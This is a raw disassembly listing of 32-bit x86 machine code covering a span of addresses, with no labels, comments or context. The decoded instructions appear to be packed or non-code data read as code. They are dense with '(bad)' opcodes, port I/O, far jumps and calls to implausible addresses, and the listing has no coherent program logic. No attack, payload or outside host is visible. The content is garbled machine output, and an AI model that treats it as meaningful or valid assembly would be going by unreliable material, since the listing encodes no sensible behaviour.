  4118c0:	and    ecx,ebx
  4118c2:	(bad)
  4118c7:	add    al,0x6e
  4118c9:	stc    
  4118ca:	fld    st(3)
  4118cc:	(bad)  
  4118cd:	repnz sub cl,al
  4118d0:	pop    ds
  4118d1:	aad    0x7a
  4118d3:	in     eax,dx
  4118d4:	jl     0x411884
  4118d6:	fild   WORD PTR [esi+ebp*1]
  4118d9:	sub    DWORD PTR [ecx+0x48],ebx
  4118dc:	bound  ebp,QWORD PTR [eax]
  4118de:	hlt    
  4118df:	mov    edx,DWORD PTR [eax-0x67]
  4118e2:	out    0x40,eax
  4118e4:	pusha  
  4118e5:	fsub   st,st(7)
  4118e7:	add    ecx,esi
  4118e9:	push   ss
  4118ea:	and    eax,0x7290235f
  4118ef:	cmc    
  4118f0:	fist   DWORD PTR [edi-0x1fd71300]
  4118f6:	sub    BYTE PTR [ebp-0x62],cl
  4118f9:	fld    DWORD PTR [ebx-0x76205550]
  4118ff:	call   0xfa3f3fbb
  411904:	sbb    ebx,DWORD PTR [esi+0x1c5ee124]
  41190a:	push   es
  41190b:	or     ecx,eax
  41190d:	cdq    
  41190e:	add    ch,dh
  411910:	pop    eax
  411911:	push   eax
  411912:	into   
  411913:	adc    eax,0xe4e902d9
  411919:	pop    ds
  41191a:	pop    esi
  41191b:	sub    ebx,DWORD PTR [edx-0x27]
  41191e:	or     DWORD PTR [ebp+0x0],0xbf538842
  411925:	cmp    BYTE PTR [ebx-0x4c309e00],dh
  41192b:	add    BYTE PTR [edx+0x38],ch
  41192e:	stc    
  41192f:	add    BYTE PTR [edx+0x38],ch
  411932:	std    
  411933:	add    BYTE PTR [edx+0x48],ch
  411936:	icebp  
  411937:	add    bl,al
  411939:	popa   
  41193a:	xor    eax,ebp
  41193c:	lods   al,BYTE PTR ds:[esi]
  41193d:	fld    DWORD PTR [si+0x5129]
  411942:	pop    ebp
  411943:	fsubp  st(1),st
  411945:	popa   
  411946:	(bad)  [ebx+0x50fd3da5]
  41194c:	jb     0x4118fe
  41194e:	xor    DWORD PTR [ecx-0x5c],esi
  411951:	pop    edi
  411952:	fld    DWORD PTR [ecx+ebp*1-0x1635a2af]
  411959:	popa   
  41195a:	fnstenv [ecx]
  41195c:	aam    0x46
  41195e:	mov    ch,0x24
  411960:	cmc    
  411961:	neg    eax
  411963:	mov    ebp,DWORD PTR ds:0x4350c58a
  411969:	imul   edx,DWORD PTR [edx+0x44],0x0
  41196d:	pop    edi
  41196e:	cmc    
  41196f:	push   eax
  411970:	dec    DWORD PTR [ebp-0x25]
  411973:	adc    al,0xe0
  411975:	sbb    DWORD PTR [edx-0x34f47b00],ebx
  41197b:	test   BYTE PTR [edi-0x7cff25c5],al
  411981:	inc    edi
  411982:	icebp  
  411983:	sbb    BYTE PTR [eax],al
  411985:	add    BYTE PTR [edi+0x59],bh
  411988:	jg     0x411a06
  41198a:	pop    ds
  41198b:	ret    0x7501
  41198e:	bound  edx,QWORD PTR [esi+0x4c]
  411991:	and    al,0x27
  411993:	out    dx,eax
  411994:	dec    esi
  411995:	sbb    BYTE PTR [ecx+0x3f301890],al
  41199b:	icebp  
  41199c:	and    BYTE PTR [ebx+0x3314fdbf],cl
  4119a2:	mov    al,ds:0x3603f557
  4119a7:	iret   
  4119a8:	fadd   DWORD PTR [ebx-0x2c802e84]
  4119ae:	mov    ebx,0xa7244c54
  4119b3:	out    0x5c,al
  4119b5:	and    al,0x63
  4119b7:	mov    ds:0xe6bd724f,al
  4119bc:	jl     0x4119e2
  4119be:	lahf   
  4119bf:	mov    ds:0xda828147,al
  4119c4:	add    BYTE PTR [eax+0x6a3fa28b],ah
  4119ca:	mov    ecx,DWORD PTR [esi+0x32558b53]
  4119d0:	push   ecx
  4119d1:	inc    ebp
  4119d2:	jns    0x4119ad
  4119d4:	test   al,al
  4119d6:	dec    DWORD PTR [edx-0x2354b981]
  4119dc:	xchg   edi,ebp
  4119de:	repnz mov eax,0x82f81424
  4119e4:	and    al,0x0
  4119e6:	bound  eax,QWORD PTR [eax+ecx*2]
  4119e9:	and    al,0x0
  4119eb:	xor    BYTE PTR [ecx],0x10
  4119ee:	adc    eax,0x1b
  4119f1:	(bad)  
  4119f2:	std    
  4119f3:	loope  0x4119db
  4119f5:	sub    BYTE PTR [edx+eiz*2],bl
  4119f8:	cmp    eax,DWORD PTR [edi-0x8bca9b]
  4119fe:	std    
  4119ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a00:	or     ch,dl
  411a02:	pop    ebp
  411a03:	and    eax,0x63b0ff44
  411a08:	push   edi
  411a09:	and    DWORD PTR [ecx+0x6a151e9e],ecx
  411a0f:	vprorvd xmm1{k1}{z},xmm5,XMMWORD PTR [ebx+0x160]
  411a16:	inc    ebx
  411a17:	pusha  
  411a18:	xor    al,BYTE PTR [ebp+0x66ec0]
  411a1e:	aaa    
  411a1f:	in     eax,dx
  411a20:	and    eax,0x32a20ffd
  411a25:	xchg   al,al
  411a27:	push   edi
  411a28:	in     eax,dx
  411a29:	shl    BYTE PTR ss:0xe1595e74,0xf6
  411a31:	and    cl,al
  411a33:	sub    al,0xa7
  411a35:	icebp  
  411a36:	cmp    DWORD PTR [ebx+ebp*8+0x78],0x134e10b
  411a3e:	je     0x411a9a
  411a40:	sti    
  411a41:	cmp    bh,ch
  411a43:	dec    edi
  411a44:	cs adc al,0x40
  411a47:	bound  esi,QWORD PTR [edi+0x7e5ce8d2]
  411a4d:	add    eax,DWORD PTR [eax]
  411a4f:	add    cl,bl
  411a51:	in     al,dx
  411a52:	in     al,dx
  411a53:	push   ebx
  411a54:	test   DWORD PTR [ecx],esi
  411a56:	add    DWORD PTR [ecx+0x4c34ca4],ecx
  411a5c:	bound  edi,QWORD PTR [edi]
  411a5e:	push   edi
  411a5f:	push   ebp
  411a60:	clc    
  411a61:	fcom   DWORD PTR [edi]
  411a63:	outs   dx,BYTE PTR ds:[esi]
  411a64:	bound  esp,QWORD PTR [esp+edx*1]
  411a67:	dec    esp
  411a68:	fistp  WORD PTR [ebp+0x50388ce7]
  411a6e:	rol    BYTE PTR [eax],1
  411a70:	jbe    0x411a97
  411a72:	xlat   BYTE PTR ds:[ebx]
  411a73:	inc    ebx
  411a74:	bound  edx,QWORD PTR [eax-0x49]
  411a77:	xchg   BYTE PTR [ebp*4+0x246484cf],dh
  411a7e:	push   0x51
  411a80:	pop    edx
  411a81:	and    al,0x6a
  411a83:	push   ecx
  411a84:	push   esi
  411a85:	and    al,0x6a
  411a87:	imul   esi,DWORD PTR [edx-0x27],0xd96e696a
  411a8e:	pusha  
  411a8f:	popa   
  411a90:	push   0x30
  411a92:	jmp    0x759f26cb
  411a97:	jbe    0x411aff
  411a99:	call   0x508f0745
  411a9e:	popf   
  411a9f:	mov    ch,BYTE PTR [ecx+esi*1]
  411aa2:	out    0x1,al
  411aa4:	in     al,0x23
  411aa6:	arpl   bx,ax
  411aa8:	push   ecx
  411aa9:	iret   
  411aaa:	mov    eax,0x6a30a48c
  411aaf:	add    ah,cl
  411ab1:	and    edx,DWORD PTR [edx-0x1a]
  411ab4:	add    bl,bl
  411ab6:	sbb    bl,BYTE PTR [esi-0x63e7e49f]
  411abc:	mov    esi,es
  411abe:	push   edi
  411abf:	cmp    ebx,DWORD PTR [ebx]
  411ac1:	fstp   DWORD PTR [ebp-0x73f3abdd]
  411ac7:	mov    bh,0x0
  411ac9:	push   ss
  411aca:	leave  
  411acb:	(bad)  
  411acd:	jmp    0x411a64
  411acf:	fbstp  TBYTE PTR [ebx+ebp*4]
  411ad2:	xchg   DWORD PTR [edi],ecx
  411ad4:	xchg   esi,eax
  411ad5:	dec    ebp
  411ad6:	(bad)  
  411ad8:	mov    WORD PTR [edx+0x5d],?
  411adb:	add    dh,dh
  411add:	out    dx,eax
  411ade:	fnsave [edx]
  411ae0:	sub    DWORD PTR [eax+0x45],edi
  411ae3:	add    cl,ch
  411ae5:	popa   
  411ae6:	scas   eax,DWORD PTR es:[edi]
  411ae7:	add    bh,BYTE PTR [edx]
  411ae9:	mov    cl,0x50
  411aeb:	into   
  411aec:	rcl    DWORD PTR [ebp+ebx*4+0x19e5e902],0xd
  411af4:	ins    DWORD PTR es:[edi],dx
  411af5:	loopne 0x411ad0
  411af7:	add    cl,ch
  411af9:	rcl    BYTE PTR [esi+0x13e919e8],cl
  411aff:	call   0x118bcba
  411b04:	ins    DWORD PTR es:[edi],dx
  411b05:	push   ds
  411b06:	scas   al,BYTE PTR es:[edi]
  411b07:	jno    0x411b7b
  411b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b0a:	shl    DWORD PTR [ecx],0xae
  411b0d:	out    0x96,eax
  411b0f:	hlt    
  411b10:	arpl   WORD PTR [ecx+eax*8+0x1437251],sp
  411b17:	adc    ch,BYTE PTR [ecx]
  411b19:	add    BYTE PTR [esi+0x51],ah
  411b1c:	inc    ebx
  411b1d:	jno    0x411af2
  411b1f:	xchg   esi,eax
  411b20:	adc    BYTE PTR [ecx],bl
  411b22:	js     0x411afa
  411b24:	mov    ebp,DWORD PTR [ebp+ebp*8-0x22e80277]
  411b2b:	or     BYTE PTR [ebx-0x7e12a5d7],al
  411b31:	int3   
  411b32:	jno    0x411b0a
  411b34:	jae    0x411b4d
  411b36:	cmp    cl,bl
  411b38:	mov    esp,DWORD PTR [ecx+edx*2+0x3b365589]
  411b3f:	and    eax,0x8acf7fd
  411b44:	sub    DWORD PTR [ecx],0x2a
  411b47:	lds    esi,FWORD PTR [edi]
  411b49:	pushf  
  411b4a:	jno    0x411af2
  411b4c:	adc    eax,0xd9e84c16
  411b51:	stos   BYTE PTR es:[edi],al
  411b52:	and    WORD PTR [eax],0x0
  411b56:	clc    
  411b57:	mov    ah,BYTE PTR [eax+eax*1]
  411b5a:	jl     0x411af8
  411b5c:	sub    bh,bh
  411b5e:	xchg   esi,eax
  411b5f:	retf   0x400f
  411b62:	jnp    0x411b93
  411b64:	sbb    BYTE PTR [ebx],dh
  411b66:	mov    al,ds:0x2f75fb87
  411b6b:	dec    edi
  411b6c:	into   
  411b6d:	push   DWORD PTR [esi+0x78bce835]
  411b73:	xlat   BYTE PTR ds:[ebx]
  411b74:	add    bh,bh
  411b76:	inc    ebp
  411b77:	and    edx,DWORD PTR [ecx]
  411b79:	cld    
  411b7a:	sbb    dl,BYTE PTR [esi+0x7e008b00]
  411b80:	(bad)  
  411b82:	sub    al,0xfd
  411b84:	fadd   QWORD PTR [eax]
  411b86:	mov    bh,al
  411b88:	sbb    BYTE PTR [esi+0x5b],0xd2
  411b8c:	pop    ss
  411b8d:	or     al,0x0
  411b8f:	mov    BYTE PTR [edx],dh
  411b91:	adc    al,0x53
  411b93:	push   esi
  411b94:	mov    eax,DWORD PTR [edi+0x7e4e64f1]
  411b9a:	adc    BYTE PTR [eax-0x7c],dh
  411b9d:	adc    al,0xeb
  411b9f:	pop    ebx
  411ba0:	scas   eax,DWORD PTR es:[edi]
  411ba1:	add    BYTE PTR [ebp+0x5018f147],cl
  411ba7:	adc    ecx,edx
  411ba9:	mov    DWORD PTR [edi+eiz*2-0xb],eax
  411bad:	push   eax
  411bae:	push   DWORD PTR [ebp+0x22]
  411bb1:	adc    eax,esp
  411bb3:	leave  
  411bb4:	xchg   ebp,eax
  411bb5:	add    BYTE PTR [ebp-0x7cc05585],al
  411bbb:	(bad)  
  411bbc:	stc    
  411bbd:	adc    al,0x5
  411bbf:	mul    cl
  411bc1:	xchg   DWORD PTR [edi+eiz*2-0x7],edx
  411bc5:	das    
  411bc6:	push   esi
  411bc7:	arpl   WORD PTR [edi+0x4c],cx
  411bca:	and    al,0xab
  411bcc:	out    0x4e,eax
  411bce:	sbb    BYTE PTR [edx-0x43],ah
  411bd1:	aas    
  411bd2:	add    ebx,ecx
  411bd4:	and    bh,bh
  411bd6:	neg    ebx
  411bd8:	jnp    0x411bff
  411bda:	sbb    cl,ah
  411bdc:	mov    esi,0x140e8701
  411be1:	sbb    eax,0x1c1e0088
  411be6:	and    esi,esi
  411be8:	mov    ds:0xe7047630,eax
  411bed:	fs jne 0x411c07
  411bf0:	jmp    0xb141866d
  411bf5:	out    0xec,eax
  411bf7:	aaa    
  411bf8:	mov    eax,ds:0x22840134
  411bfd:	out    0x9f,al
  411bff:	xor    ah,BYTE PTR [edx]
  411c01:	enter  0x5b5e,0x89
  411c05:	mov    bl,0xc8
  411c07:	adc    al,0x21
  411c09:	lods   al,BYTE PTR ds:[esi]
  411c0a:	dec    eax
  411c0b:	and    al,0x7a
  411c0d:	test   eax,0xd8eb0c46
  411c12:	or     al,0x87
  411c14:	mov    WORD PTR [edx],fs
  411c16:	mov    bl,BYTE PTR [esi+0x6e]
  411c19:	loop   0x411c1c
  411c1b:	jmp    0x5390de26
  411c20:	mov    WORD PTR [edi+0x3de1f787],?
  411c26:	sti    
  411c27:	mov    DWORD PTR [ebp+0x6e55882a],edx
  411c2d:	stos   DWORD PTR es:[edi],eax
  411c2e:	shl    DWORD PTR [ecx],0xa0
  411c31:	retf   
  411c32:	lds    esi,FWORD PTR [esi+edi*1-0x4d]
  411c36:	rol    DWORD PTR [ebx],0x38
  411c39:	xor    al,BYTE PTR [eax+0x524462d2]
  411c3f:	mov    DWORD PTR [ebp+0x6042ee9a],esp
  411c45:	xor    al,BYTE PTR [ebp-0x26d1ff40]
  411c4b:	mov    esi,0xd2c91788
  411c50:	je     0x411cbc
  411c52:	pop    esp
  411c53:	add    eax,0xff0fdb07
  411c58:	inc    eax
  411c59:	mov    edx,ebx
  411c5b:	out    0x88,eax
  411c5d:	call   0xfd56:0x35782256
  411c64:	jp     0x411cbe
  411c66:	mov    bl,0x96
  411c68:	cld    
  411c69:	push   ecx
  411c6a:	xchg   ecx,eax
  411c6b:	stc    
  411c6c:	inc    ebx
  411c6d:	bound  esi,QWORD PTR [edx+esi*8]
  411c70:	push   ebp
  411c71:	mov    bl,0x54
  411c73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c74:	jmp    0x411ca4
  411c76:	fwait
  411c77:	jmp    0x271f77f
  411c7c:	out    dx,al
  411c7d:	mov    cl,0xbe
  411c7f:	push   ecx
  411c80:	add    esi,DWORD PTR [edi]
  411c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c83:	or     esp,DWORD PTR [ebx+ebx*8]
  411c86:	push   es
  411c87:	(bad)  
  411c88:	enter  0xcb3a,0xe1
  411c8c:	add    ah,BYTE PTR [edx+0x54]
  411c8f:	sub    ebp,DWORD PTR [eax]
  411c91:	jp     0x411ce5
  411c93:	call   0xe3e63f1e
  411c98:	mov    bl,0x5
  411c9a:	xor    esi,eax
  411c9c:	mov    BYTE PTR [ebx],ch
  411c9e:	xor    edx,ebx
  411ca0:	(bad)  
  411ca1:	cmc    
  411ca2:	pop    ds
  411ca3:	mov    ecx,0xc7f8fc3
  411ca8:	pop    ecx
  411ca9:	lea    ebx,[ebx]
  411cab:	out    dx,eax
  411cac:	add    eax,DWORD PTR [eax]
  411cae:	jecxz  0x411cdc
  411cb0:	jmp    0x411d02
  411cb2:	jmp    0x411d30
  411cb4:	or     ebx,DWORD PTR [ecx+esi*1]
  411cb7:	xchg   DWORD PTR [esi+0x7f54688],esi
  411cbd:	mov    DWORD PTR [edi-0x3a77d505],esp
  411cc3:	pop    ebx
  411cc4:	add    BYTE PTR [ecx],dh
  411cc6:	scas   al,BYTE PTR es:[edi]
  411cc7:	int    0x84
  411cc9:	dec    ebp
  411cca:	popa   
  411ccb:	fld    DWORD PTR [eax]
  411ccd:	je     0x411cf4
  411ccf:	cmc    
  411cd0:	and    BYTE PTR [ecx-0x14bd2777],bh
  411cd6:	popa   
  411cd7:	push   ebp
  411cd8:	rcr    dh,0xdd
  411cdb:	push   edx
  411cdc:	add    cl,ch
  411cde:	popa   
  411cdf:	loop   0x411d3d
  411ce1:	lds    edi,FWORD PTR ds:0x616985ce
  411ce7:	fld    DWORD PTR [eax]
  411ce9:	jnp    0x411d4a
  411ceb:	loop   0x411d69
  411ced:	or     eax,0x1a78a886
  411cf2:	sub    al,0x57
  411cf4:	push   esp
  411cf5:	or     eax,0x43ebe886
  411cfa:	pop    esi
  411cfb:	mov    dl,BYTE PTR [edx+0x72]
  411cfe:	sub    BYTE PTR [edx],dh
  411d00:	xor    al,0x2b
  411d02:	pop    esp
  411d03:	fld    DWORD PTR [ecx+ebp*4-0x1695814e]
  411d0a:	ficom  DWORD PTR [ebp-0x4c4e02dc]
  411d10:	add    ebp,DWORD PTR [eax+eax*1-0x5e]
  411d14:	cmc    
  411d15:	and    BYTE PTR [ecx],bh
  411d17:	or     eax,ebp
  411d19:	std    
  411d1a:	hlt    
  411d1b:	add    esp,ecx
  411d1d:	inc    eax
  411d1e:	jmp    0x26b53705
  411d23:	fstp   QWORD PTR [ebp-0x559d26dc]
  411d29:	inc    eax
  411d2a:	arpl   WORD PTR [edx+0x281b18f5],bx
  411d30:	ror    DWORD PTR [ecx+0x31c575a5],0xaf
  411d37:	imul   edx,DWORD PTR [eax+0x54],0x4c517e05
  411d3e:	add    BYTE PTR [edi-0x43],ch
  411d41:	das    
  411d42:	leave  
  411d43:	xor    bl,BYTE PTR [ecx+0x14b81424]
  411d49:	bswap  ebp
  411d4b:	cmp    BYTE PTR ds:0xd55a8301,dl
  411d51:	aaa    
  411d52:	xlat   BYTE PTR ds:[ebx]
  411d53:	out    dx,al
  411d54:	push   ds
  411d55:	cmp    bl,ch
  411d57:	out    dx,eax
  411d58:	rol    BYTE PTR [edi+0x248902d0],0x20
  411d5f:	lock sub esi,DWORD PTR [edi]
  411d62:	retf   
  411d63:	in     al,dx
  411d64:	xlat   BYTE PTR ds:[ebx]
  411d65:	jb     0x411cfb
  411d67:	mov    al,0x1b
  411d69:	jbe    0x411cfb
  411d6b:	test   eax,0xa65e5b1a
  411d70:	jle    0x411df1
  411d72:	les    eax,FWORD PTR [edi+0x14]
  411d75:	or     BYTE PTR [eax],al
  411d77:	add    BYTE PTR ds:0x3a1824de,ch
  411d7d:	test   eax,0xf9a783e9
  411d82:	adc    al,0x0
  411d84:	ins    DWORD PTR es:[edi],dx
  411d85:	cmp    eax,DWORD PTR [ebp+0x564d0b46]
  411d8b:	or     dl,al
  411d8d:	mov    al,0xc
  411d8f:	mov    DWORD PTR [ebp-0x37],edx
  411d92:	mov    al,0x1
  411d94:	lock add DWORD PTR [ecx-0x75],edx
  411d98:	out    0x56,eax
  411d9a:	in     al,dx
  411d9b:	adc    BYTE PTR [eax-0x75],cl
  411d9e:	xchg   ecx,esi
  411da0:	jo     0x411d3a
  411da2:	or     BYTE PTR [ebx],ah
  411da4:	cmp    eax,0x74f87fd1
  411da9:	rol    DWORD PTR [eax+ecx*4+0x3300d9fb],cl
  411db0:	and    BYTE PTR [edi+0x22c776fb],al
  411db6:	jbe    0x411dc0
  411db8:	bound  ebx,QWORD PTR [eax+0x30603f77]
  411dbe:	jge    0x411d80
  411dc0:	ss pop esi
  411dc2:	push   esi
  411dc3:	mov    ebx,DWORD PTR [edi]
  411dc5:	fcom   QWORD PTR [ecx+0x6a]
  411dc8:	addr16 mov ch,0x40
  411dcb:	hlt    
  411dcc:	adc    ch,bh
  411dce:	das    
  411dcf:	std    
  411dd0:	ja     0x411da2
  411dd2:	adc    eax,DWORD PTR [eax+0x62]
  411dd5:	mov    ch,0xc1
  411dd7:	je     0x411e06
  411dd9:	mov    bl,0x78
  411ddb:	cld    
  411ddc:	add    BYTE PTR [edi+0x45],bl
  411ddf:	pop    esp
  411de0:	mov    ch,BYTE PTR [eax+edi*1]
  411de3:	xor    ecx,DWORD PTR [ebx+0x7a]
  411de6:	stos   BYTE PTR es:[edi],al
  411de7:	push   eax
  411de8:	hlt    
  411de9:	xor    DWORD PTR [esi],edi
  411deb:	sbb    DWORD PTR [eax+0x4e33309b],eax
  411df1:	jp     0x411db2
  411df3:	push   edx
  411df4:	sbb    BYTE PTR [ecx-0x25f38e05],dh
  411dfa:	cmc    
  411dfb:	cld    
  411dfc:	std    
  411dfd:	int3   
  411dfe:	cmp    cl,BYTE PTR [esi+ecx*8-0x170f4215]
  411e05:	outs   dx,BYTE PTR ds:[esi]
  411e06:	icebp  
  411e07:	push   es
  411e08:	add    dh,ah
  411e0a:	jb     0x411e7c
  411e0c:	sub    al,0x91
  411e0e:	jge    0x411e4d
  411e10:	cld    
  411e11:	mov    dl,0xc8
  411e13:	std    
  411e14:	mov    bl,BYTE PTR [edi+0x54fd5446]
  411e1a:	inc    ebx
  411e1b:	or     eax,0x4f270d8
  411e20:	and    DWORD PTR [edx],0x1f
  411e23:	push   cs
  411e24:	xor    DWORD PTR [edi-0x62],0xa35d72fd
  411e2b:	xor    bh,ch
  411e2d:	xchg   esp,eax
  411e2e:	sbb    bh,al
  411e30:	adc    esi,DWORD PTR [esi-0x27]
  411e33:	cli    
  411e34:	inc    ebx
  411e35:	bound  ebp,QWORD PTR [ecx-0x18]
  411e38:	in     al,dx
  411e39:	pusha  
  411e3a:	out    0x27,eax
  411e3c:	pop    edx
  411e3d:	sub    edx,DWORD PTR [edx]
  411e3f:	sub    al,BYTE PTR [ebp-0x65323200]
  411e45:	dec    esi
  411e46:	or     al,0x84
  411e48:	jo     0x411e92
  411e4a:	xchg   cl,cl
  411e4c:	aas    
  411e4d:	dec    eax
  411e4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e4f:	(bad)  
  411e51:	clc    
  411e52:	push   ss
  411e53:	cmc    
  411e54:	retf   
  411e55:	test   BYTE PTR [esi],ah
  411e57:	cmc    
  411e58:	(bad)  
  411e59:	clc    
  411e5a:	(bad)  
  411e5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e5c:	retf   
  411e5d:	pop    ds
  411e5e:	push   ebx
  411e5f:	add    BYTE PTR [ecx-0x347a16fb],al
  411e65:	pop    ds
  411e66:	or     eax,0x738cff50
  411e6b:	push   eax
  411e6c:	add    ch,ah
  411e6e:	aad    0xaa
  411e70:	jmp    0xbe67d78
  411e75:	adc    al,0x57
  411e77:	(bad)  
  411e78:	sub    edx,DWORD PTR [esi]
  411e7a:	mov    ds:0x7e4f62d9,al
  411e7f:	leave  
  411e80:	pusha  
  411e81:	push   edi
  411e82:	xchg   ch,dh
  411e84:	jb     0x411ecb
  411e86:	adc    BYTE PTR [edx+0x23],0x20
  411e8a:	adc    BYTE PTR [esi-0x59],0x8c
  411e8e:	sahf   
  411e8f:	cmc    
  411e90:	iret   
  411e91:	outs   dx,DWORD PTR ds:[esi]
  411e92:	pop    edi
  411e93:	push   eax
  411e94:	xor    DWORD PTR [eax],ebx
  411e96:	dec    ebp
  411e97:	ficom  DWORD PTR [ebx]
  411e99:	dec    ebx
  411e9a:	loope  0x411ebe
  411e9c:	sbb    al,0x1d
  411e9e:	dec    ebp
  411e9f:	mov    ds:0x506674df,al
  411ea4:	js     0x411e92
  411ea6:	add    BYTE PTR [eax+0x50],dl
  411ea9:	adc    esp,DWORD PTR [eax]
  411eab:	push   esi
  411eac:	loop   0x411eae
  411eae:	sbb    BYTE PTR [edx-0x56],ah
  411eb1:	pop    es
  411eb2:	bound  esi,QWORD PTR [eax]
  411eb4:	aad    0x89
  411eb6:	push   eax
  411eb7:	call   0xdf364340
  411ebc:	test   BYTE PTR [ecx+ecx*1],ah
  411ebf:	retf   
  411ec0:	xchg   esp,eax
  411ec1:	and    al,0x5
  411ec3:	out    0x5b,eax
  411ec5:	or     al,0x0
  411ec7:	adc    dh,ch
  411ec9:	and    al,0x72
  411ecb:	sbb    eax,0x99bb10f5
  411ed0:	push   edi
  411ed1:	div    BYTE PTR [edx+eiz*1-0x76368564]
  411ed8:	fld    DWORD PTR [eax]
  411eda:	jmp    0x4c4e0f6
  411edf:	cmc    
  411ee0:	mov    BYTE PTR [ecx+0x37e28e14],cl
  411ee6:	sub    BYTE PTR [ecx-0x56],0x45
  411eea:	ins    BYTE PTR es:[edi],dx
  411eeb:	loop   0x411f5f
  411eed:	add    al,0xe9
  411eef:	popa   
  411ef0:	push   esp
  411ef1:	ja     0x411ed8
  411ef3:	call   0x901327d2
  411ef8:	dec    esi
  411ef9:	push   0x1
  411efb:	mov    cl,0x50
  411efd:	inc    ebx
  411efe:	jmp    0x3a3e2ddb
  411f03:	push   0x50
  411f05:	lock push 0x2c
  411f08:	sbb    eax,0xb9000b74
  411f0d:	and    ecx,DWORD PTR [edx+ebp*8]
  411f10:	mov    dl,0xd5
  411f12:	je     0x411ee7
  411f14:	call   0xe94243ae
  411f19:	test   DWORD PTR [ecx+edi*8],esp
  411f1c:	(bad)  
  411f1e:	mov    ebp,DWORD PTR [esi-0x1c]
  411f21:	aad    0x0
  411f23:	jmp    0x45bb16
  411f28:	jb     0x411f05
  411f2a:	or     BYTE PTR [ebx-0x74fbd006],dh
  411f30:	inc    edi
  411f31:	stc    
  411f32:	adc    BYTE PTR [edx+0x4c],dl
  411f35:	enter  0x1240,0xb
  411f39:	xlat   BYTE PTR ds:[ebx]
  411f3a:	pop    ebx
  411f3b:	pop    esi
  411f3c:	push   cs
  411f3d:	push   ecx
  411f3e:	mov    edi,0xc19385b
  411f43:	ret    0xd69f
  411f46:	dec    edi
  411f47:	push   esi
  411f48:	aam    0x4f
  411f4a:	in     eax,dx
  411f4b:	push   esi
  411f4c:	ins    BYTE PTR es:[edi],dx
  411f4d:	enter  0x124c,0xfb
  411f51:	(bad)  
  411f52:	das    
  411f53:	fild   DWORD PTR [eax]
  411f55:	push   ds
  411f56:	cmp    BYTE PTR [esi-0x59],bl
  411f59:	lods   al,BYTE PTR ds:[esi]
  411f5a:	das    
  411f5b:	sysexit 
  411f5d:	(bad)  [ecx]
  411f5f:	(bad)  
  411f61:	xchg   ebx,eax
  411f62:	and    al,0x3
  411f64:	inc    esp
  411f65:	out    0xd2,al
  411f67:	idiv   DWORD PTR [edx-0x50]
  411f6a:	adc    al,0xff
  411f6c:	idiv   DWORD PTR [ecx-0x4aff72ec]
  411f72:	mov    esp,0xd737d267
  411f77:	ret    0x3c50
  411f7a:	leave  
  411f7b:	pusha  
  411f7c:	push   ss
  411f7d:	jnp    0x411f54
  411f7f:	jg     0x411f45
  411f81:	aas    
  411f82:	pop    ecx
  411f83:	shl    BYTE PTR [edx+eax*4-0x2e],0xb6
  411f88:	inc    esi
  411f89:	fidiv  DWORD PTR [bx]
  411f8c:	clc    
  411f8d:	imul   edx,DWORD PTR [eax],0x55574e8a
  411f93:	cmc    
  411f94:	xor    bl,BYTE PTR [eax-0x31]
  411f97:	or     esi,DWORD PTR [esi-0x7742dc3e]
  411f9d:	cmp    eax,0x6214e7f9
  411fa2:	mov    dh,0x3b
  411fa4:	and    ebp,DWORD PTR [ebp-0x7e]
  411fa7:	stc    
  411fa8:	(bad)  
  411fa9:	and    ah,BYTE PTR [ebx]
  411fab:	stos   DWORD PTR es:[edi],eax
  411fac:	rcr    BYTE PTR [ebp-0x1e],0xcc
  411fb0:	xchg   edi,eax
  411fb1:	in     eax,dx
  411fb2:	test   al,0x89
  411fb4:	push   esi
  411fb5:	xchg   edi,edx
  411fb7:	cmc    
  411fb8:	adc    al,0x48
  411fba:	sbb    al,0xf6
  411fbc:	je     0x411f44
  411fbe:	and    al,0x88
  411fc0:	inc    esi
  411fc1:	jl     0x411ff2
  411fc3:	mov    esi,0x5524bd50
  411fc8:	push   ss
  411fc9:	and    dh,BYTE PTR [eax]
  411fcb:	add    ah,0x5e
  411fce:	lahf   
  411fcf:	add    al,0x56
  411fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fd2:	cld    
  411fd3:	inc    eax
  411fd4:	adc    al,BYTE PTR [eax]
  411fd6:	and    dh,BYTE PTR [eax]
  411fd8:	push   esi
  411fd9:	pop    esi
  411fda:	call   0x67037acd
  411fdf:	xor    BYTE PTR [ebx-0x77],cl
  411fe2:	xchg   ebx,eax
  411fe3:	pop    edx
  411fe4:	mov    dl,BYTE PTR [esi+0x6a]
  411fe7:	outs   dx,BYTE PTR ds:[esi]
  411fe8:	push   0xffffffd2
  411fea:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  411fec:	inc    ebx
  411fed:	add    al,0x7a
  411fef:	dec    ebp
  411ff0:	cld    
  411ff1:	jmp    DWORD PTR [ebp-0x55]
  411ff4:	shl    DWORD PTR [ebx+0x67],0x83
  411ff8:	leave  
  411ff9:	std    
  411ffa:	dec    ecx
  411ffb:	jmp    0x7401:0x6867c7f
  412002:	imul   edi,DWORD PTR [ebx+0x3e],0x8
  412006:	leave  
  412007:	inc    edx
  412008:	or     BYTE PTR [ecx],al
  41200a:	pushf  
  41200b:	push   es
  41200c:	addr16 or al,0x2d
  41200f:	iret   
  412010:	and    BYTE PTR [eax],dl
  412012:	xchg   edx,eax
  412013:	dec    edi
  412014:	or     eax,0x4c2745c
  412019:	sbb    DWORD PTR [esi],0xa488f3da
  41201f:	loope  0x41208d
  412021:	dec    esp
  412022:	add    eax,0x9f0c2562
  412027:	mov    bh,0xa9
  412029:	add    BYTE PTR [edx-0x51],ah
  41202c:	jb     0x412021
  41202e:	(bad)  [ebp-0x6024f43d]
  412034:	fild   QWORD PTR [eax-0x5b]
  412037:	in     eax,0x2
  412039:	les    eax,FWORD PTR [eax]
  41203b:	data16 mov al,0x74
  41203e:	jbe    0x4120a6
  412040:	fsub   st(6),st
  412042:	add    BYTE PTR [edi-0x2c],bl
  412045:	out    0x71,al
  412047:	imul   ebp,DWORD PTR [ecx+0x166535c],0x76
  41204e:	cli    
  41204f:	lods   eax,DWORD PTR ds:[esi]
  412050:	sbb    BYTE PTR [edx+0x2],dl
  412053:	jo     0x41206e
  412055:	imul   eax,esp,0x16
  412058:	jmp    0x64ab668b
